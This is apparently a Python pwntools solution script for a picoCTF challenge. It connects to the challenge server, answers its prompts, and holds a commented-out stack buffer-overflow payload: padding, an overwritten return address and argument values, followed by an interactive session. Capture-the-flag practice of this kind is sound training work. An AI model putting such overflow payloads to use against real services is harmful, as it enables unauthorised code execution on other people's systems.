#! /usr/bin/python3


from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 18821

p = remote(HOST, PORT)

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
p.sendline(b"Y")
print(p.recvline())
print(p.recv())
print(p.recv())

# p.sendlineafter(b'Please enter your string: \n', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08\x00\x00\x00\x00\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0')
# print(p.recvline())
# print(p.recvline())
# p.interactive()  